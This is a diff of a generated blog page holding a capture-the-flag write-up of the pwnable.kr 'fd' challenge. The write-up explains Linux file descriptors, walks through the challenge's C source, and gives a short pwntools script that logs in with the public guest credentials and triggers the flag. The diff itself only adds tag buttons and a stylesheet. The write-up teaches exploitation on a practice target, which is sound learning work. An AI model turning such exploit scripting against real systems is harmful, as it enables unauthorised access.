@@ -18,7 +18,8 @@
 <script type="application/ld+json">
 {"@type":"BlogPosting","headline":"pwnable.kr - fd , Understanding Linux File Descriptors and creating a simple exploit with python pwntools","dateModified":"2019-02-19T00:00:00+02:00","url":"http://localhost:4000/pwn/fd/","datePublished":"2019-02-19T00:00:00+02:00","image":"http://localhost:4000/pwn/fd/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/fd/"},"description":"Introduction Hey guys , Lately I have been doing pwn challenges and I decided to share some stuff with you from time to time like I do with the other write-ups. Today we will solve fd from pwnable.kr , it’s a very easy one but as always we will go in detail. pwn means to compromise or control, specifically another computer (server or PC), website, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking. -Wikipedia Challenge Description Mommy! what is a file descriptor in Linux? ssh fd@pwnable.kr -p2222 (pw:guest) We have ssh login info, and some sort of a hint , before doing anything let’s talk about file descriptors , because that’s what the hint said. File descriptors File descriptors simply are indicators or handles used to access a file or i/o (input/output) resource , File descriptors are represented in c as integers and there are 3 types of file descriptors : standard input (stdin) , its integer value is 0 standard output (stdout) , its integer value is 1 standard error (stderr) , its integer value is 2 To summarize this up , when you run a program and give it arguments through sys.argv for example , that’s stdin , whatever the program gives you back as an output , that’s stdout . If the program gave you an error , because you missed a required argument or gave it a wrong argument for example , that’s stderr. Source analysis After we ssh to the server (ssh fd@pwnable.kr -p2222 , password : guest) we find 3 files fd , fd.c and flag. fd is an executable , and fd.c is the source of that executable And we don’t have permissions to view flag : Let’s take a look at the source : #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; } Breakdown : char buf[32]; This assigns a buffer of 32 chars to the variable buf if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } Here it starts by checking if we passed and argument or not , and if we didn’t , it will print pass argv[1] a number int fd = atoi( argv[1] ) - 0x1234; Then it defines a variable called fd , the value of that variable is atoi( argv[1] ) - 0x1234. atoi() is a function in c that converts a string into an integer , it stands for Ascii to Integer , 0x1234 is the hex of 4660 So it subtracts 4660 from our input. int len = 0; This defines a variable called len and assigns a value of 0 to it len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; Here it’s taking fd and also reading our input and puts it into buf , then there’s an if statement which checks if the value of buf is LETMEIN , if it’s then it will print good job and give us the flag , but if it’s not it will print learn about Linux file IO. Exploitation Now we have an idea about the logic of the program , and a pwn challenge is all about breaking that logic. Let’s run the program just to test : ./fd 1337 It prints learn about Linux file IO , because we didn’t get fd right. We know that fd is an abbreviation for file descriptor , and there are 3 file descriptors stdin stdout stderr , And we can also control the value of fd because we know that it’s subtracting 4660 from argv[1] and we control argv[1] , how are we giving the program argv[1] ? Through stdin which is represented by 0 , so if we gave the program 4660 , fd = 4660 - 4660 , fd = 0. Let’s try it. Now it didn’t print learn about Linux file IO , instead of that it’s reading our input –&gt; len = read(fd, buf, 32); We knew earlier that we have to make buf = “LETMEWIN” to execute the first if condition : And we got the flag : “mommy! I think I know what a file descriptor is!!” Exploitation with python pwntools We will use a python library called pwntools to create an exploit. Read the documentation here We will import the pwntools library : from pwn import * Then we will set up an ssh connection to the server : shell = ssh(&#39;fd&#39; ,&#39;pwnable.kr&#39; ,password=&#39;guest&#39;, port=2222) fd is the username , pwnable.kr is the host After that we will start a process to execute ./fd 4660 process = shell.process(executable=&#39;./fd&#39;, argv=[&#39;fd&#39;,&#39;4660&#39;]) And finally we will send LETMEWIN and read the output process.sendline(&#39;LETMEWIN&#39;) print process.recv() Final script : #!/usr/bin/python from pwn import * shell = ssh(&#39;fd&#39; ,&#39;pwnable.kr&#39; ,password=&#39;guest&#39;, port=2222) process = shell.process(executable=&#39;./fd&#39;, argv=[&#39;fd&#39;,&#39;4660&#39;]) process.sendline(&#39;LETMEWIN&#39;) print process.recv() Let’s try it : ./exploit.py And it’s working ! That’s it , Feedback is appreciated ! Don’t forget to read the other write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/ad.css">
+<link rel="stylesheet" href="/assets/css/tagbuttons.css">
+  <link rel="stylesheet" href="/assets/css/ad.css">
   <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
@@ -42,7 +43,7 @@
           </span>
         </label>
 
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
       </nav></div>
 </header>
 <main class="page-content" aria-label="Content">
@@ -52,6 +53,21 @@
   <header class="post-header">
     <h1 class="post-title p-name" itemprop="name headline">pwnable.kr - fd , Understanding Linux File Descriptors and creating a simple exploit with python pwntools</h1>
     <p class="post-meta">
+      <h7>
+        Tags: 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Binary Exploitation/';">Binary Exploitation</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/c/';">c</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
+        
+      </h7>
+      <br>
       <time class="dt-published" datetime="2019-02-19T00:00:00+02:00" itemprop="datePublished">Feb 19, 2019
       </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
 </p>
@@ -213,7 +229,6 @@ int main(int argc, char* argv[], char* envp[]){
   </div>
 <script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/pwn/fd/" hidden></a>
 </article>
-
 
       </div>
     </main><footer class="site-footer h-card">
